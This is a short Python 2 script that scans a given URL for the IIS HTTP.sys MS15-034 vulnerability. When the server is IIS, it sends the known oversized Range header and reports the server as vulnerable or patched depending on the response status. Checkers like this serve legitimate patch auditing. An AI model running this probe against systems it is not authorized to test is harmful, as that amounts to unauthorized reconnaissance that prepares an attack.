import requests
import sys
def checking(target):
    try:
        req=requests.get(target)
        req_server=req.headers['server']
        if "Microsoft-IIS" in req_server:
            print "The Target server is %s"%req_server
            ms15_034(target)
        else:
            print "The Target server is %s,Not IIS"%req_server
    except Exception,e:
        print "%s"%e

def ms15_034(target):
    print "Using ms15_034 to try the %s ..."%target

    check_header={'Range':'bytes=0-18446744073709551615'}
    req=requests.get(target,headers=check_header)
    print req

    if "Requested Range Not Satisfiable" in req.headers or req.status_code==416:
        print "The ms15_034 Exists ! ! !"
    elif ("The request has an invalid header name" in req.headers or req.status_code==400):
        print "The ms15_034 has been patched !"
    elif req.status_code==401 or req.status_code==403:
        print "Can't check status.(401 or 403)"
    else:
        print 'can not determine server status .(unknown response)'


if __name__ == '__main__':
    if len(sys.argv)<2:
        print "Usage: <target_address>".format(sys.argv[0])
        sys.exit(1)
    target=sys.argv[1]
    if target.find('http')<0:
        target="http://"+target
    checking(target)